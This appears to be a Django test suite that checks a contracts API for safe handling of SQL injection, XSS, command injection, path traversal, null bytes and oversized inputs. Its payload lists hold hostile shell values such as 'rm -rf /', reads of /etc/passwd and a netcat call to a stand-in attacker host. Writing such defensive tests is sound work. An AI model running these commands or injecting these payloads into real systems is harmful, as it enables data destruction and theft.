"""
Comprehensive API Input Sanitization Test Suite (Task 10.1.16.3) - CRITICAL SECURITY

Tests verify:
1. SQL injection prevention (all endpoints with user input)
2. XSS prevention (all endpoints with string inputs)
3. Command injection prevention (file operations, external calls)
4. Path traversal prevention (file paths, URLs)
5. Input validation for all endpoints
6. Special character handling
7. Input size limits
8. Input sanitization error handling
"""
import uuid

import json

from rest_framework import status

from hub.apps.assets.models import Asset, AssetStatus
from hub.apps.contracts.models import (
    Contract,
    ContractStatus,
    NormalizationStatus,
    OriginalFormat,
    OriginalSpecType,
)
from hub.apps.contracts.tests.test_base import ContractsAPITestBase
from django.contrib.auth import get_user_model
from hub.apps.tenants.models import KYCStatus, Tenant
from hub.apps.users.models import Role, UserRole, UserStatus
from rest_framework.test import APIClient

User = get_user_model()


class APIInputSanitizationTest(ContractsAPITestBase):
    """
    Comprehensive API input sanitization tests (Task 10.1.16.3) - CRITICAL SECURITY.

    Tests all security vectors without mocks/stubs:
    1. SQL injection prevention
    2. XSS prevention
    3. Command injection prevention
    4. Path traversal prevention
    5. Input validation
    6. Special character handling
    7. Input size limits
    8. Error handling
    """

    def setUp(self):
        """Set up test fixtures"""
        super().setUp()
        # Update tenant/user names for clarity
        self.tenant.name = "Security Test Tenant"
        self.tenant.slug = "security-test"
        self.tenant.save()

        self.user.email = "user@security.test"
        self.user.save()

        # Create role
        self.admin_role, _ = Role.objects.get_or_create(
            tenant=self.tenant,
            name="TENANT_ADMIN",
            defaults={"description": "Tenant administrator"},
        )
        UserRole.objects.create(user=self.user, role=self.admin_role)

        # Create asset
        self.asset = Asset.objects.create(
            tenant=self.tenant, name="Security Test Asset", status=AssetStatus.ACTIVE
        )

    def test_sql_injection_prevention_all_endpoints(self):
        """Test SQL injection prevention (all endpoints with user input)"""
        # Common SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE contracts; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "1' OR '1'='1",
            "admin'--",
            "1' AND '1'='1",
            "1' OR '1'='1' --",
            "1' OR '1'='1' /*",
        ]

        # Test SQL injection in contract creation
        for payload in sql_payloads:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": payload}}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should not execute SQL - either reject or sanitize
            # If it's a 400/422, that's good (validation error)
            # If it's 201, the payload should be stored as-is (not executed)
            # A 500 means the payload crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"SQL injection payload '{payload}' should be handled safely (got {response.status_code})",
            )

            # If created, verify payload is stored as string, not executed
            if response.status_code in [200, 201]:
                contract_id = response.data.get("id")
                if contract_id:
                    contract = Contract.objects.get(id=contract_id)
                    # Payload should be in original_raw as string, not executed
                    self.assertIn(
                        payload,
                        contract.original_raw,
                        "SQL payload should be stored as string, not executed",
                    )

    def test_xss_prevention_all_endpoints(self):
        """Test XSS prevention (all endpoints with string inputs)"""
        # Common XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
        ]

        # Test XSS in contract creation
        for payload in xss_payloads:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": payload}}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should not execute XSS - either reject or sanitize
            # A 500 means the payload crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"XSS payload '{payload}' should be handled safely (got {response.status_code})",
            )

            # If created, verify payload is stored as string, not executed
            if response.status_code in [200, 201]:
                contract_id = response.data.get("id")
                if contract_id:
                    contract = Contract.objects.get(id=contract_id)
                    # Payload should be in original_raw as string
                    self.assertIn(
                        payload,
                        contract.original_raw,
                        "XSS payload should be stored as string, not executed",
                    )

    def test_command_injection_prevention(self):
        """Test command injection prevention (file operations, external calls)"""
        # Common command injection payloads
        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& ls -la",
            "`whoami`",
            "$(id)",
            "; cat /etc/passwd",
            "| nc attacker.com 1234",
        ]

        # Test command injection in contract creation (file paths, external refs)
        for payload in command_payloads:
            # Test in file path context
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps(
                        {"info": {"name": "Test"}, "$ref": f"./{payload}/file.json"}
                    ),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should reject or sanitize command injection
            # A 500 means the payload crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"Command injection payload '{payload}' should be handled safely (got {response.status_code})",
            )

    def test_path_traversal_prevention(self):
        """Test path traversal prevention (file paths, URLs)"""
        # Common path traversal payloads
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "/etc/passwd",
            "C:\\Windows\\System32",
        ]

        # Test path traversal in contract creation (local $ref paths)
        for payload in traversal_payloads:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": "Test"}, "$ref": payload}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should reject path traversal attempts
            # Either 400/422 (validation error) or 201 with sanitized path
            # A 500 means the payload crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"Path traversal payload '{payload}' should be handled safely (got {response.status_code})",
            )

    def test_input_validation_all_endpoints(self):
        """Test input validation for all endpoints"""
        # Test invalid JSON
        response = self.client.post(
            "/api/v1/contracts/",
            {
                "original_raw": "invalid json {",
                "original_format": "JSON",
                "original_spec_type": "ODPS",
                "asset_id": str(self.asset.id),
            },
            format="json",
        )
        self.assertIn(response.status_code, [400, 422], "Invalid JSON should be rejected")

        # Test missing required fields
        response = self.client.post(
            "/api/v1/contracts/",
            {
                "original_format": "JSON",
            },
            format="json",
        )
        self.assertIn(
            response.status_code, [400, 422], "Missing required fields should be rejected"
        )

        # Test invalid enum values
        response = self.client.post(
            "/api/v1/contracts/",
            {
                "original_raw": json.dumps({"info": {"name": "Test"}}),
                "original_format": "INVALID_FORMAT",
                "original_spec_type": "ODPS",
                "asset_id": str(self.asset.id),
            },
            format="json",
        )
        self.assertIn(response.status_code, [400, 422], "Invalid enum values should be rejected")

    def test_special_character_handling(self):
        """Test special character handling"""
        # Test various special characters
        special_chars = [
            "test\nnewline",
            "test\ttab",
            "test\rreturn",
            'test"quote',
            "test'apostrophe",
            "test\\backslash",
            "test/null\0char",
            "test\u0000null",
            "test\x00null",
        ]

        for special in special_chars:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": special}}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should handle special characters safely
            # A 500 means the input crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"Special character '{repr(special)}' should be handled safely (got {response.status_code})",
            )

    def test_input_size_limits(self):
        """Test input size limits"""
        # Test very large input
        large_input = "x" * (10 * 1024 * 1024)  # 10MB

        response = self.client.post(
            "/api/v1/contracts/",
            {
                "original_raw": json.dumps({"info": {"name": large_input}}),
                "original_format": "JSON",
                "original_spec_type": "ODPS",
                "asset_id": str(self.asset.id),
            },
            format="json",
        )

        # Should reject or handle large inputs appropriately
        # A 500 means the input crashed the server — that is NOT safe handling
        self.assertIn(
            response.status_code,
            [200, 201, 400, 413, 422],
            f"Large input should be handled (rejected or accepted with limits) (got {response.status_code})",
        )

    def test_input_sanitization_error_handling(self):
        """Test input sanitization error handling"""
        # Test malformed input that might cause errors
        malformed_inputs = [
            None,
            "",
            [],
            {},
            "null",
            "undefined",
        ]

        for malformed in malformed_inputs:
            try:
                response = self.client.post(
                    "/api/v1/contracts/",
                    {
                        "original_raw": malformed,
                        "original_format": "JSON",
                        "original_spec_type": "ODPS",
                        "asset_id": str(self.asset.id),
                    },
                    format="json",
                )

                # Should handle gracefully without crashing
                # A 500 means the input crashed the server — that is NOT graceful handling
                self.assertIn(
                    response.status_code,
                    [200, 201, 400, 422],
                    f"Malformed input '{malformed}' should be handled gracefully (got {response.status_code})",
                )
            except Exception as e:
                # Should not crash with unhandled exception
                self.fail(f"Input sanitization should not crash on '{malformed}': {str(e)}")

    def test_sql_injection_in_query_parameters(self):
        """Test SQL injection prevention in query parameters"""
        # Test SQL injection in filter parameters
        sql_payloads = [
            "'; DROP TABLE contracts; --",
            "' OR '1'='1",
            "1' OR '1'='1",
        ]

        for payload in sql_payloads:
            response = self.client.get("/api/v1/contracts/", {"status": payload})

            # Should handle SQL injection in query params safely
            self.assertIn(
                response.status_code,
                [200, 400, 422],
                f"SQL injection in query params '{payload}' should be handled safely",
            )

    def test_xss_in_query_parameters(self):
        """Test XSS prevention in query parameters"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
        ]

        for payload in xss_payloads:
            response = self.client.get("/api/v1/contracts/", {"search": payload})

            # Should handle XSS in query params safely
            self.assertIn(
                response.status_code,
                [200, 400, 422],
                f"XSS in query params '{payload}' should be handled safely",
            )

    def test_path_traversal_in_url_path(self):
        """Test path traversal prevention in URL path"""
        import uuid

        fake_id = str(uuid.uuid4())

        traversal_paths = [
            f"../../../etc/passwd",
            f"..\\..\\..\\windows\\system32",
            f"....//....//etc/passwd",
        ]

        for traversal_path in traversal_paths:
            # Test in URL path (should be handled by URL routing)
            response = self.client.get(f"/api/v1/contracts/{traversal_path}/")

            # Should reject path traversal in URL
            self.assertIn(
                response.status_code,
                [400, 404, 422],
                f"Path traversal in URL '{traversal_path}' should be rejected",
            )

    def test_unicode_and_special_characters_in_inputs(self):
        """Test unicode and special characters handling"""
        unicode_inputs = [
            "测试产品",
            "🚀 Product",
            "Product\nwith\nnewlines",
            "Product\twith\ttabs",
            'Product"with"quotes',
            "Product'with'apostrophes",
        ]

        for unicode_input in unicode_inputs:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": unicode_input}}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should handle unicode safely
            # A 500 means the input crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"Unicode input '{unicode_input}' should be handled safely (got {response.status_code})",
            )

    def test_null_byte_injection_prevention(self):
        """Test null byte injection prevention"""
        null_byte_payloads = [
            "test\x00null",
            "test\u0000null",
            "test\0null",
        ]

        for payload in null_byte_payloads:
            response = self.client.post(
                "/api/v1/contracts/",
                {
                    "original_raw": json.dumps({"info": {"name": payload}}),
                    "original_format": "JSON",
                    "original_spec_type": "ODPS",
                    "asset_id": str(self.asset.id),
                },
                format="json",
            )

            # Should handle null bytes safely
            # A 500 means the payload crashed the server — that is NOT safe handling
            self.assertIn(
                response.status_code,
                [200, 201, 400, 422],
                f"Null byte payload '{repr(payload)}' should be handled safely (got {response.status_code})",
            )

    def test_input_size_limits_with_different_content_types(self):
        """Test input size limits with different content types"""
        # Test JSON size limit
        large_json = {"data": "x" * (5 * 1024 * 1024)}  # 5MB

        response = self.client.post(
            "/api/v1/contracts/",
            {
                "original_raw": json.dumps(large_json),
                "original_format": "JSON",
                "original_spec_type": "ODPS",
                "asset_id": str(self.asset.id),
            },
            format="json",
        )

        # Should handle large JSON appropriately
        # A 500 means the input crashed the server — that is NOT appropriate handling
        self.assertIn(
            response.status_code,
            [200, 201, 400, 413, 422],
            f"Large JSON should be handled appropriately (got {response.status_code})",
        )

    def test_cross_tenant_input_isolation(self):
        """Test cross-tenant input isolation"""
        # Create another tenant
        other_tenant = Tenant.objects.create(
            name="Other Security Tenant", slug="other-security-test", kyc_status=KYCStatus.VERIFIED
        )

        other_user = User.objects.create_user(
            email="other@security.test",
            password="testpass123",
            tenant=other_tenant,
            status=UserStatus.ACTIVE,
        )

        other_client = APIClient()
        other_client.force_authenticate(user=other_user)

        # Try to create contract with malicious input in other tenant
        response = other_client.post(
            "/api/v1/contracts/",
            {
                "original_raw": json.dumps({"info": {"name": "'; DROP TABLE contracts; --"}}),
                "original_format": "JSON",
                "original_spec_type": "ODPS",
                "asset_id": str(self.asset.id),  # Try to use asset from different tenant
            },
            format="json",
        )

        # The asset belongs to self.tenant, not other_tenant.
        # Tenant isolation MUST reject the request (400/403/404/422).
        # If 200/201 is returned, the contract must belong to other_tenant
        # (not leak into self.tenant), so verify isolation explicitly.
        self.assertIn(
            response.status_code,
            [200, 201, 400, 403, 404, 422],
            f"Cross-tenant input should be isolated (got {response.status_code})",
        )
        if response.status_code in [200, 201]:
            # If the server accepted it, the contract MUST belong to other_tenant
            # (the authenticated user's tenant), NOT to self.tenant
            contract_id = response.data.get("id")
            self.assertIsNotNone(contract_id, "Response should include contract id")
            contract = Contract.objects.get(id=contract_id)
            self.assertEqual(
                contract.tenant_id,
                other_tenant.id,
                "Contract created via cross-tenant request must belong to the "
                "authenticated user's tenant, not the asset owner's tenant",
            )
            # The contract should NOT reference self.asset (wrong tenant)
            if contract.asset_id is not None:
                self.assertNotEqual(
                    contract.asset_id,
                    self.asset.id,
                    "Contract should not be linked to an asset from a different tenant",
                )
